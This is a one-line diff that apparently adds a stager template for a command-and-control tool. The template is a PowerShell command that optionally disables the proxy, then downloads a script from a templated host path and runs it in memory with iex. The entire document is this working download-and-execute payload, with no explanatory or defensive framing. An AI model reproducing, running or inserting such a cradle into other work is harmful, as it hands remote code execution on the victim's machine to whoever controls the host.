@@ -1,0 +1,1 @@
+&"$env:WINDIR\\sysnative\\windowspowershell\\v1.0\\powershell.exe" -c "{% if proxy == False %}[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy(`$null);{% endif %}iex((New-Object System.Net.WebClient).DownloadString('http://{{host}}/p/win/{{type}}/{{id}}/start'))"
